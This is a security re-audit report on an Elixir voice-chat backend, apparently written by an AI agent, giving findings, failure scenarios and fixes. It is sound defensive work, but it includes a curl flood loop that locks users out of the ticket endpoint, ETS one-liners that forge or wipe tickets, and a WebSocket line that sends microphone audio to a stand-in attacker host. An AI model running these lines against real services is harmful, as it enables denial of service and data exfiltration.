# Security Re-Audit: live-ceci

Date: 2026-08-29 (re-run). Scope: `lib/` (~1200 LOC), `config/runtime.exs`, `priv/frontend/`.
Previous score 62/D. The eight fixes listed in the brief were verified present and, with the
exceptions noted below, correct. This report contains **only what is still open or newly
broken**.

## Verification of the claimed fixes (one line each)

Bind IP (`application.ex:10`), origin check (`router.ex:60`), tickets (`tickets.ex`), session
cap checked before `provider.open` (`socket.ex:47` precedes `:75`), redaction at all seven
Logger sites, `Process.flag(:sensitive, true)` (`grok.ex:138`), security headers
(`router.ex:38`), tool coercion (`tools.ex:243`), no `String.to_atom` in `lib/`, mailbox
shedding (`socket.ex:143`), `send_timeout: 5_000` (`application.ex:27`) — all real, all
present. Three of them are **incomplete in a way that reopens the thing they closed**: items
P1-1, P2-3 and P2-6 below.

## Threat-model note that frames everything

`Origin` is a browser-enforced header. Against `curl` it is one line of `-H`. So for any
attacker that is not a browser — another process on the machine, anything on the LAN once
`BIND_IP` opens — the Origin check and the ticket are both free to satisfy, and the only
surviving controls are `max_sessions: 8` / `max_sessions_per_address: 4`. Every finding below
should be read with that in mind: the browser-facing story is now decent, the
non-browser-facing story is a 4-session budget and nothing else.

---

# P1

## P1-1. Unbounded upstream mailbox: the shedding is one-directional

- **Severity**: Critical (memory exhaustion / VM kill from one authorized session)
- **Location**: `lib/live_ceci/socket.ex:99-112` → `lib/live_ceci/provider/grok.ex:98`
- **OWASP**: A04:2021 Insecure Design / uncontrolled resource consumption

`socket.ex:140-152` documents the downstream unbounded-growth path and sheds voice frames past
`@max_queued 40`. The **upstream** direction has no equivalent, and on the default provider it
has the same shape:

```elixir
# socket.ex:104
case provider.send_audio(session, pcm) do        # per browser binary frame

# grok.ex:98 — the comment says this "returns immediately", which is the problem
WebSockex.cast(ws, {:send_audio, pcm})           # async, never blocks, no backpressure
```

Bandit reads frames as fast as TCP delivers them, up to `max_frame_size: 1_000_000`
(`router.ex:125`). Each one is `cast` into the WebSockex process, which drains at the speed of
a TLS socket to `api.x.ai`. Browser inbound bandwidth is local-loopback or LAN; upstream is
the internet. The mailbox grows by the difference, without bound, for the life of the session.

**Failure scenario**: one client holds one legitimate session (ticket obtained, origin
allowed, under the cap) and writes 1 MB binary frames in a tight loop. At a 100:1 local-vs-WAN
throughput ratio the WebSockex process accumulates ~99 MB per second of wall clock. Four
sessions (`max_sessions_per_address`) reach the machine's memory ceiling in seconds; the BEAM
is OOM-killed, taking every other listener with it. `Process.flag(:sensitive, true)`
(`grok.ex:138`) additionally hides that mailbox from `Process.info/2`, so the diagnostic that
would explain the crash is deliberately unavailable.

Note the Gemini path does **not** have this bug: `LiveSession.send_audio/3` is a
`GenServer.call` with a 1 s timeout (`live_session.ex:33`), which is backpressure. The
asymmetry is invisible from `socket.ex`, which is why it survived.

**Fix** — shed upstream on the same principle as downstream, in the socket, so it holds for
both providers:

```elixir
# socket.ex, in the binary handle_in/2 clause
def handle_in({pcm, [opcode: :binary]}, %{session: session, provider: provider} = state)
    when session != nil do
  cond do
    byte_size(pcm) > @max_frame_bytes ->
      # 100 ms of 16 kHz s16le is 3200 bytes; anything an order of magnitude past
      # that is not the microphone.
      {:ok, state}

    provider_backlogged?(session) ->
      Logger.warning("dropping mic frame — upstream not draining")
      {:ok, state}

    true ->
      _ = provider.send_audio(session, pcm)
      {:ok, state}
  end
end

defp provider_backlogged?(session) do
  match?({:message_queue_len, n} when n > @max_upstream_queued,
         Process.info(session, :message_queue_len))
end
```

`Process.info/2` on a `:sensitive` process returns `[]` for `:message_queue_len`, so either
drop the `:sensitive` flag (its only job — hiding `extra_headers` — is better done by not
putting the key in the process state) or have `Grok.handle_cast/2` count frames in its own
state and drop past a threshold. The frame-size bound is worth having regardless: a 3200-byte
mic frame has no reason to be allowed at 1 MB, and `max_frame_size` should come down to match.

## P1-2. `POST /ws-ticket` is an unauthenticated global lockout

- **Severity**: High (complete, sustained denial of service; one line of shell)
- **Location**: `lib/live_ceci/tickets.ex:60-71`, `lib/live_ceci/router.ex:95-114`
- **OWASP**: A04:2021 / lack of resources & rate limiting

`@max_outstanding 200` is described as "the bound that stops an unauthenticated endpoint
growing a table without end" (`tickets.ex:36`). It is that, but it is also a **global**
counter, and `issue/1` **refuses the newest arrival** rather than evicting the oldest. There is
no rate limit and no per-address quota anywhere on this endpoint.

**Failure scenario**:

```sh
while :; do curl -s -XPOST -H 'Origin: http://localhost' http://127.0.0.1:8000/ws-ticket; done
```

The table hits 200 in well under a second. From that moment every legitimate
`fetchTicket()` (`main.js:101`) gets a 503, `connect()` bails to "não consegui autorizar a
conexão", and the app is unusable. The tickets expire after 30 s, but the loop refills them
faster than the sweep drains them, so the outage is permanent and costs the attacker nothing.
The origin header is not a control here — it is a constant.

The module doc anticipates the wrong half of this: it notes that against a direct HTTP client
the ticket is "two requests instead of one." It is not. Against a direct HTTP client the ticket
system is a **new** denial-of-service primitive that did not exist before it was added, because
it introduced a shared, exhaustible, globally-scoped resource in front of the only entry point.

**Fix** — make the cap per-address, and evict rather than refuse so a flood cannot lock out a
third party:

```elixir
@max_outstanding 200
@max_per_address 5

def issue(address) do
  sweep()

  cond do
    count_for(address) >= @max_per_address ->
      {:error, :too_many}

    :ets.info(@table, :size) >= @max_outstanding ->
      # Evict the oldest rather than refusing the newest: refusing the newest lets
      # whoever fills the table decide who else gets in.
      evict_oldest()
      insert(address)

    true ->
      insert(address)
  end
end

defp count_for(address) do
  :ets.select_count(@table, [{{:_, :_, address}, [], [true]}])
end
```

Also worth a token-bucket on `/ws-ticket` keyed by `conn.remote_ip` — a client needs one ticket
per WebSocket connection, so a few per minute is generous.

---

# P2

## P2-3. `Gemini.open/1` leaks a live, billed session on connect failure

- **Severity**: High (unbounded upstream spend; identical to a bug already fixed on the other provider)
- **Location**: `lib/live_ceci/provider/gemini.ex:28-33`

```elixir
def open(opts) do
  with {:ok, session} <- Session.start_link(session_opts(opts)),
       :ok <- Session.connect(session) do
    {:ok, session}
  end
end
```

If `Session.connect/1` returns an error, the `with` returns that error and **drops `session` on
the floor**. `Socket.open_session/0` then stores `%{session: nil, ...}` (`socket.ex:92`), so
`terminate/2` never calls `provider.close/1` (`socket.ex:190` is guarded on `session`), and the
socket process exits `:normal` — a signal a non-trapping linked process ignores. The
`Gemini.Live.Session` GenServer stays alive, holding an open upstream WebSocket, forever.

This is verbatim the bug that `grok.ex:64-73` already fixes, complete with a comment describing
this exact mechanism ("Socket.init stores session: nil on an error, so terminate/2 never calls
close/1, and the socket's :normal exit is ignored by a WebSockex process that does not trap").
The fix was applied to one provider and not the other.

Worse than the Grok version, because the `Sessions` slot is keyed to the **socket** pid
(`sessions.ex:79`) and is released when the socket dies. So each leaked Gemini session is
invisible to the cap: repeat a failing connect N times and you get N live upstream sessions
with `Sessions.total() == 0`.

**Failure scenario**: an expired or rate-limited API key makes `Session.connect/1` fail
consistently. `main.js` shows "reconectar" and a user clicks it a dozen times; each click
leaks a session process and an upstream socket. Nothing reaps them.

**Fix**:

```elixir
def open(opts) do
  case Session.start_link(session_opts(opts)) do
    {:ok, session} ->
      case Session.connect(session) do
        :ok -> {:ok, session}
        {:error, reason} -> close(session); {:error, reason}
        other -> close(session); {:error, other}
      end

    {:error, reason} ->
      {:error, reason}
  end
end
```

`close/1` at `gemini.ex:92` already has the timeout guard this needs.

## P2-4. No session lifetime, no volume budget — the cap bounds concurrency, not spend

- **Severity**: High (unbounded cost against a metered third-party API)
- **Location**: `lib/live_ceci/application.ex:26` (`timeout: 60_000`), `lib/live_ceci/socket.ex` (no lifetime), `lib/live_ceci/sessions.ex`

`Sessions` caps 8 concurrent / 4 per address. Nothing caps **how long** one lasts or **how much
audio** goes through it. Bandit's `timeout: 60_000` is an *idle* timeout, and the mic streams
continuously by design (`main.js:173`), so it never fires — the moduledoc at `socket.ex:89-93`
already relies on that fact for a different reason.

**Failure scenario**: a tab left open overnight, or four deliberate ones, hold four billed
upstream voice sessions for 12 hours. The bill is 48 session-hours and no log line, alert, or
control anywhere in the app has an opinion about it. `Sessions.total()` reads 4 the whole time,
which is exactly what the cap says is fine.

The brief lists "the browser's audio reaches the provider unfiltered" as known-open. This is a
different axis: not *what* is in the audio, but that there is no bound on *duration or volume*.
Filtering the content would not fix it.

**Fix**: arm a lifetime timer in `Socket.init/1` and account bytes:

```elixir
# in open_session/0, after the provider is open
Process.send_after(self(), :session_expired, @max_session_ms)   # e.g. 30 minutes

def handle_info(:session_expired, state) do
  Logger.info("closing session at the lifetime cap")
  {:stop, :normal, state}
end
```

Track `bytes_upstream` in the socket state and stop at a budget (30 min of 16 kHz s16le is
~57 MB — anything past that is not a conversation). The client already handles an unexpected
close gracefully (`main.js:120`), so a reconnect is a non-event; a bill is not.

## P2-5. A reverse proxy silently voids the address binding and turns the per-address cap into a global one

- **Severity**: High (both controls fail open on the documented deployment path)
- **Location**: `lib/live_ceci/router.ex:75, 98, 123`; `lib/live_ceci/sessions.ex:102`

`conn.remote_ip` is the TCP peer. There is no `Plug.RewriteOn`, no trusted-proxy list, and no
`x-forwarded-for` handling anywhere — which is the **correct** default and should stay. The
problem is that `router.ex:28-30` explicitly directs the operator to the configuration that
breaks it: *"A deployment that reaches the network needs a proxy in front doing TLS and HSTS."*

The moment that proxy exists, every request arrives from the proxy's address. Two controls fail
at once, both silently:

1. **Ticket address binding becomes a no-op** (`tickets.ex:68` / `router.ex:75`). Every ticket
   is minted for, and consumable from, the same address. The property the module doc says
   "starts mattering the moment `BIND_IP` opens up" stops existing at exactly that moment.
2. **`max_sessions_per_address: 4` becomes a global cap of 4** (`sessions.ex:94-102`,
   `sessions.ex:70`). One client opens four tabs and every other user on the internet is
   refused with 1013 "muitas conexões". The `max_sessions: 8` total is never reached; the
   per-address limit, meant to be the tighter of the two for one abuser, becomes the tighter of
   the two for everybody.

**Failure scenario**: nginx terminates TLS on the same host, proxying to 127.0.0.1:8000. Four
concurrent users is now the hard ceiling of the entire deployment, and the fifth is told the
service is busy while `Sessions.total()` is 4 of 8. Nothing logs the cause, because from the
app's point of view four sessions really are open from one address.

**Fix**: do not add blanket `X-Forwarded-For` trust — that trades this for header spoofing.
Either (a) make the proxy speak PROXY protocol and have ThousandIsland decode it, so
`remote_ip` stays real; or (b) if `X-Forwarded-For` must be used, gate it on an explicit
`TRUSTED_PROXIES` allowlist checked against `conn.remote_ip` before rewriting, and refuse to
start if the env var is set without one. At minimum, log a warning at boot when `bind_ip` is
not loopback, naming both controls that depend on `remote_ip` being the real client.

## P2-6. The session cap's own logging is a self-amplifying stall

- **Severity**: Medium-High (turns an over-cap condition into a hard failure for legitimate clients)
- **Location**: `lib/live_ceci/sessions.ex:64-82`, reached from `lib/live_ceci/socket.ex:47`

`join/1` is a `GenServer.call` on a single process, and `handle_call/3` calls
`Logger.warning/1` on **every** refusal (`sessions.ex:67` and `:71-74`), inside the serialized
section, before replying.

Logger's default std handler flips to synchronous mode at `sync_mode_qlen` and blocks the
calling process at `flush_qlen`. Once refusals arrive faster than the handler writes them, the
`Sessions` GenServer is blocking on I/O while holding the only decision point in front of every
upgrade. Callers queue; at 5 s (the default `GenServer.call` timeout, not overridden at
`sessions.ex:48`) `join/1` raises an exit **in the Bandit connection process**, which kills the
WebSock `init/1` after the 101 has already been sent.

**Failure scenario**: an attacker who is already at the 4-session cap keeps reconnecting in a
loop. Every attempt is refused, and every refusal is a log line and a
`:inet.ntoa/1` call from the serialized process. Legitimate users, who are *under* the cap and
should be admitted, now sit behind that queue and get a broken connection instead of a clean
1013 — the failure mode the module doc says the design exists to prevent ("Refusing while slots
are free is an outage, which is a worse failure than the one the cap exists to prevent"). The
same argument applies to the log line, and the log line was added after it.

**Fix**: get the logging out of the critical section and rate-limit it.

```elixir
def handle_call({:join, address}, {pid, _tag}, holders) do
  cond do
    map_size(holders) >= max_total() ->
      {:reply, {:error, :too_many_sessions}, holders, {:continue, {:log_refusal, :total}}}
    ...
  end
end

def handle_continue({:log_refusal, why}, holders) do
  # after the reply is sent, and at most once every N seconds
  maybe_log(why)
  {:noreply, holders}
end
```

Give `join/1` an explicit short timeout (`GenServer.call(__MODULE__, {:join, address}, 1_000)`)
and catch the exit into `{:error, :too_many_sessions}`, so a stalled canary refuses cleanly
instead of crashing the upgrade:

```elixir
def join(address) do
  GenServer.call(__MODULE__, {:join, address}, 1_000)
catch
  :exit, _ -> {:error, :too_many_sessions}
end
```

The same unbounded-logging concern applies to `router.ex:108` and `router.ex:129`, but those
run in the per-connection process, so they flood the log rather than serializing behind one
mailbox. Still worth a rate limit.

---

# P3

## P3-7. `origin_allowed?/1`: userinfo is ignored, host comparison is case-sensitive

- **Location**: `lib/live_ceci/router.ex:60-68`

Two edge cases, neither reachable from a browser (browsers serialize `Origin` as
`scheme://host[:port]`, lowercased, with no userinfo), but both wrong if this function is ever
reused or if a non-browser client is in scope:

- `URI.parse("http://evil.example@localhost")` yields `host: "localhost"`, `userinfo:
  "evil.example"` → **allowed**. The reverse, `"http://localhost@evil.example"`, correctly
  yields `host: "evil.example"` → rejected. So the specific string named in the brief is safe;
  its mirror is not.
- `URI.parse/1` does not downcase the host, so `Origin: http://LOCALHOST:5173` is **rejected**,
  and an `ALLOWED_ORIGINS` entry differing in case or carrying a trailing `/` never matches
  (`origin in allowed_origins` at `:63` is an exact binary compare against the raw header).

The first fails open, the second fails closed. The second is the one that will waste an
afternoon when `BIND_IP` opens and a real origin is added.

**Fix**:

```elixir
def origin_allowed?(origin) when is_binary(origin) do
  case URI.parse(origin) do
    %URI{scheme: scheme, host: host, userinfo: nil, path: path}
    when scheme in ["http", "https"] and is_binary(host) and path in [nil, "", "/"] ->
      host = String.downcase(host, :ascii)
      host in @loopback_hosts or normalize(origin) in normalized_allowed_origins()

    _ ->
      false
  end
end
```

Reject a non-empty `userinfo` outright — an `Origin` never has one — and normalize both sides
of the allowlist compare (downcase scheme+host, strip a trailing slash).

Also note `@loopback_hosts` includes both `"::1"` and `"[::1]"`; `URI.parse/1`'s
`split_authority/1` strips the brackets, so the `"[::1]"` entry is dead. Harmless, but it
implies a bracket case is being handled that never arrives.

## P3-8. The ticket is destroyed before the address is checked — a leaked ticket becomes a guaranteed denial

- **Location**: `lib/live_ceci/tickets.ex:89-95`

```elixir
case :ets.take(@table, ticket) do
  [{^ticket, expires_at, ^address}] -> ...
  _other -> {:error, :invalid}
end
```

`:ets.take/2` removes the row **before** the address is matched. A ticket presented from the
wrong address is rejected *and consumed*. The module doc justifies address binding as
protection ("A ticket minted for one host cannot be presented from another"), but combined with
the destructive take it also hands an attacker a denial primitive against the ticket's rightful
owner.

**Failure scenario**: the module doc names the leak paths itself — "proxy logs, browser
history, `Referer`". Anyone who reads a ticket out of one of those (or off the LAN once
`BIND_IP` opens) and replays it from the wrong address does not get a session — but the
legitimate client's `new WebSocket(...)`, racing behind it, gets a 403, and `main.js:120`
reports "a linha caiu". A ticket read from a log is supposed to be harmless because it is
already spent; here, reading it makes it spent.

Second scenario, dual-stack: with `BIND_IP=::`, `fetch("/ws-ticket")` and
`new WebSocket(...)` are separate connections, and Happy Eyeballs can resolve `localhost` to
`127.0.0.1` for one and `::1` for the other. Mismatch, ticket burned, and the retry needs a
fresh ticket that may land the same way. Not reachable at the current loopback-IPv4 default,
but it is one env var away and there is no test for it.

**Fix**: look before you take, and normalise IPv4-mapped IPv6 on the way in.

```elixir
def consume(ticket, address) when is_binary(ticket) do
  address = normalize_address(address)

  case :ets.lookup(@table, ticket) do
    [{^ticket, expires_at, ^address}] ->
      # take/2 still does the atomic single-use claim; the address check just no
      # longer costs the ticket when it fails.
      case :ets.take(@table, ticket) do
        [{^ticket, ^expires_at, ^address}] when expires_at > 0 ->
          if now() < expires_at, do: :ok, else: {:error, :invalid}

        _ ->
          {:error, :invalid}
      end

    _ ->
      {:error, :invalid}
  end
end

defp normalize_address({0, 0, 0, 0, 0, 0xFFFF, a, b}),
  do: {div(a, 256), rem(a, 256), div(b, 256), rem(b, 256)}

defp normalize_address(address), do: address
```

Apply `normalize_address/1` in `issue/1` too. (The `when expires_at > 0` guard is deliberately
absent above for the reason documented at `tickets.ex:85-88` — do not reintroduce it; the
snippet's version is inside a `take` result match, not a match spec, but it is safer to just
drop it.)

On the timing question raised in the brief: `:ets.take/2` on a `:set` hashes the 43-character
key and does not compare byte-wise with an early exit that is measurable across a socket, and
the two failure paths (absent vs. expired vs. wrong-address) differ by one integer comparison.
Against a 256-bit CSPRNG value this is not an attack. `:crypto.strong_rand_bytes(32) |>
Base.url_encode64(padding: false)` is the right construction and needs no change.

## P3-9. `:public` named ETS: any code in the VM can forge or wipe every ticket

- **Location**: `lib/live_ceci/tickets.ex:117`

```elixir
:ets.new(@table, [:named_table, :public, :set, read_concurrency: true])
```

Named + public means every process in the VM — including all of `bandit`, `plug`, `websockex`,
`gemini_ex` and their transitive deps — can reach it by atom with no capability:

```elixir
:ets.insert(LiveCeci.Tickets, {"forged", System.monotonic_time(:millisecond) + 86_400_000, {1,2,3,4}})
:ets.delete_all_objects(LiveCeci.Tickets)   # every outstanding ticket, gone
```

An attacker who is already executing code in this VM has won regardless, so this is not a
privilege boundary. It is worth recording because the moduledoc justifies `:public` purely on
latency grounds ("the upgrade path must not queue behind a single process") without naming what
`:public` costs, and because the second call above is a one-liner denial that any dependency
could trip by accident with a name collision.

`:protected` is not available while `consume/2` calls `:ets.take/2` from the caller — `take` is
a write. If that trade is deliberate (it reasonably is), say so in the comment at
`tickets.ex:114-117`, and add `write_concurrency: true`, which is currently missing and matters
now that every `/ws-ticket` and every `/ws` writes to this table from a different process.

## P3-10. `Redact` cannot see a key it was handed, and misses two common renderings

- **Location**: `lib/live_ceci/redact.ex:44-49, 90-102`; `lib/live_ceci/provider/grok.ex:41`

Three gaps, in descending likelihood:

1. **A key passed as an option is invisible to `redact_known/1`.** `Grok.open/1` accepts
   `Keyword.get(opts, :api_key)` (`grok.ex:41`), but `secrets/0` only reads
   `Application.get_env(:gemini_ex, :api_key)` and three env vars. A key supplied through that
   documented parameter is not in any of the four sources, so pass one cannot match it and it
   falls through to pass two — which only catches it if it happens to sit behind `key=`,
   `Bearer `, `api_key<delim>` or `access_token<delim>`. Today only tests use that path; it is
   a live seam, and the module's whole first-pass argument ("it is matching the string that is
   actually secret") is false for it.

2. **A non-printable binary defeats both passes.** `Kernel.inspect/2` renders a binary
   containing a non-printable byte as `<<3, 232, 65, 80, 73, ...>>` — decimal bytes, not text.
   Neither `String.replace/3` nor any of the four regexes can match that, and the key is in the
   log in full, one byte at a time. Reachable whenever an upstream reason carries a raw frame
   payload rather than a parsed string. `WebSockex` splits the close code off before handing
   over a reason, so the obvious path is closed on the Grok side, but `{:provider, {:error,
   reason}}` and `{:provider, {:closed, reason}}` (`socket.ex:167, 172`) accept anything a
   provider hands them, and `gemini.ex:71-72` passes `gemini_ex`'s reasons through untouched.

3. **The contextual patterns are narrow.** `(?<=api[_-]?key["':= ]{1,4})` requires a delimiter
   immediately after `key`, so xAI's plausible `"Incorrect API key provided: xai-..."` does not
   match — `key provided:` puts ` p` where the class expects `"'`, `=` or `:`. And the value
   class `[A-Za-z0-9._\-]` excludes `+` and `/`, so a base64 credential is truncated at the
   first of either, leaving the tail in the log. Note also that these lookbehinds are
   variable-length (`{1,4}`), which only compiles on PCRE2 — i.e. recent OTP. On an older OTP
   this module fails to compile rather than silently degrading, which is the better failure, but
   it is undeclared: `mix.exs:8` pins `elixir: "~> 1.17"` and says nothing about OTP.

**Fix** for (1) and (2):

```elixir
def inspect(term) do
  term
  |> Kernel.inspect(limit: 8, printable_limit: 512)
  |> scrub()
end

# Add a byte-sequence pass for the <<...>> rendering.
defp redact_byte_lists(text) do
  Enum.reduce(secrets(), text, fn secret, acc ->
    rendered = secret |> :binary.bin_to_list() |> Enum.join(", ")
    String.replace(acc, rendered, "…#{@placeholder}…")
  end)
end
```

and register a key handed in via `opts` — have `Grok.open/1` push it into a runtime-configured
list that `secrets/0` reads, or drop the `:api_key` option so there is exactly one source of
truth. For (3), widen the value class to `[^\s"',}\]]` (still excluding `[`, per the existing
comment) and add a `key\s+[a-z]+[:=]\s*` alternative.

Finally, `printable_limit: 512` truncates a long binary mid-string. If a key straddles that
boundary its prefix survives into the log while `redact_known/1` — matching the whole string —
does not fire. Pass two usually catches it; when the key is not behind a recognised delimiter,
it does not.

## P3-11. CSP `connect-src ws: wss:` allows exfiltration to any host

- **Location**: `lib/live_ceci/router.ex:33`

```
connect-src 'self' ws: wss:
```

`ws:` and `wss:` are bare scheme sources — they permit a WebSocket to **any** host. The comment
above the policy argues the page "opens the only network it needs back here," which is true
(`main.js:117` builds the URL from `location.host`), and CSP Level 3 `'self'` already matches
`ws://` and `wss://` on the same host and port in every current browser. So the two scheme
sources buy nothing and cost the one thing this policy is for: after an XSS or a compromised
script, `new WebSocket("wss://evil.example")` is permitted and the microphone stream can be
mirrored off-origin.

**Fix**: `connect-src 'self'`. If a browser in scope turns out not to match `ws://` under
`'self'`, name the origin explicitly rather than the scheme.

Two smaller header gaps while in this function (`router.ex:38-44`): there is no
`X-Frame-Options: DENY` companion to `frame-ancestors 'none'` (only matters for legacy
browsers), and no `Cross-Origin-Resource-Policy: same-origin`. `object-src` falls back to
`default-src 'self'`; `object-src 'none'` would be tighter and costs nothing here.

## P3-12. `Socket.init/1` defaults a missing address to loopback

- **Location**: `lib/live_ceci/socket.ex:47`

```elixir
LiveCeci.Sessions.join(Keyword.get(opts, :address, {127, 0, 0, 1}))
```

`router.ex:123` always passes `:address`, so this default is currently unreachable. If that ever
changes, every connection is accounted to `127.0.0.1` and `max_sessions_per_address: 4` becomes
a global cap of 4 — the same failure as P2-5, arriving through a different door, and silently.
Prefer `Keyword.fetch!(opts, :address)`: a crash at the upgrade is a better outcome than a cap
that quietly means something else.

## P3-13. Browser text frames are parsed with no size or depth guard

- **Location**: `lib/live_ceci/socket.ex:118-126`, `lib/live_ceci/router.ex:125`

`max_frame_size: 1_000_000` applies to text frames too, and `Jason.decode/1` is called on all of
them. Jason parses recursively, so ~1 MB of `[[[[…]]]]` is a deep recursion whose stack grows on
the process heap. One authorized session can send these back-to-back; the CPU and memory burn is
per-frame and unbounded by anything except the 4-session cap.

Cheaper than P1-1 and requires the same foothold, so it is only worth fixing alongside it — but
the same frame-size bound closes both. The only text message the protocol defines is
`{"type":"end_of_speech"}`, 26 bytes:

```elixir
def handle_in({data, [opcode: :text]}, state) when byte_size(data) > 256, do: {:ok, state}
```

---

## Recommendations, in order

1. **P1-1** — bound the upstream direction: a frame-size ceiling in `handle_in/2` plus shedding
   when the provider process is backlogged. This is the one that kills the VM.
2. **P1-2** — per-address ticket quota and evict-oldest instead of refuse-newest.
3. **P2-3** — close the Gemini session when `connect/1` fails; port the fix that already exists
   in `grok.ex`.
4. **P2-4** — a maximum session lifetime and an upstream byte budget.
5. **P2-6** — logging out of `Sessions.handle_call/3`, explicit short call timeout, catch the
   exit.
6. **P2-5** — decide the proxy story now and write it down; PROXY protocol or an explicit
   trusted-proxy allowlist, plus a boot warning when `bind_ip` is not loopback.
7. **P3-7, P3-8, P3-12** — small, cheap correctness fixes on the ticket and origin paths.
8. **P3-10** — widen `Redact`; the byte-list rendering is the gap most likely to actually leak.
9. **P3-11** — drop `ws: wss:` from `connect-src`.

## Tests worth adding

The suite is 181 tests and the fixed items are covered. These are not:

- `/ws-ticket` refuses a flood from one address without locking out a second address (P1-2).
- A binary frame larger than a plausible mic batch is dropped, not forwarded (P1-1).
- `Gemini.open/1` leaves no live process when `Session.connect/1` returns an error (P2-3).
- `consume/2` with a wrong address leaves the ticket spendable by the right one (P3-8).
- `origin_allowed?("http://evil.example@localhost")` is `false`; `origin_allowed?("http://LOCALHOST")` is `true` (P3-7).
- `Redact.inspect(<<0, 1>> <> "Bearer " <> key)` does not contain the key's bytes (P3-10).

## Tools to run manually (this agent has no Bash access)

```
mix sobelow --exit medium      # will be quiet — no Phoenix — but confirms it
mix deps.audit
mix hex.audit
```
